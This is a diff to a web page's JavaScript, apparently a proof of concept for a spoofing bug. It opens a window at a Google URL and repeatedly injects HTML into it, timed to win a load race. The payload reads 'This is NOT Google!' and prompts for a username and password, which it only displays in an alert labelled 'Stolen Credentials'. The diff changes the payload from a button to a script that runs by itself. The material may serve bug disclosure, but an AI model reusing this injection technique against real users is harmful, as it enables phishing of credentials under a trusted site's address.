@@ -6,13 +6,14 @@
   <script>
     function spoof() {
       let win = window.open("https://www.google.com/gen_204", "_blank");
+
       let payload = `
         <h1>This is NOT Google!</h1>
-        <button onclick="
-          let u=prompt('Username?'); 
-          let p=prompt('Password?'); 
-          alert('Stolen: '+u+' / '+p);
-        ">Click Me</button>
+        <script>
+          let u = prompt('Enter your username:');
+          let p = prompt('Enter your password:');
+          alert('Stolen Credentials:\\nUsername: ' + u + '\\nPassword: ' + p);
+        <\/script>
       `;
 
       let inject = () => {
@@ -25,7 +26,7 @@
         }
       };
 
-      // Multiple attempts to beat load race condition
+      // Multiple attempts to beat race condition
       setTimeout(inject, 10);
       setTimeout(inject, 50);
       setTimeout(inject, 100);
